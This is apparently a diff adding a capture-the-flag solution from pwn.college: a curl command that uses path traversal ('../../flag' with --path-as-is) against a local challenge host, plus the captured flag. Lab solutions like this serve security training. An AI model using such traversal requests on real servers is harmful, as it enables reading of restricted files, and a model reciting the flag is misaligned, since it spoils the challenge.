@@ -1,0 +1,2 @@
+curl -v --path-as-is 'http://challenge.localhost/data/../../flag'
+#pwn.college{c5gtDwW7r9qA-VkyXC6PdUcRgFN.QX3gzMzwCMxADNwEzW}
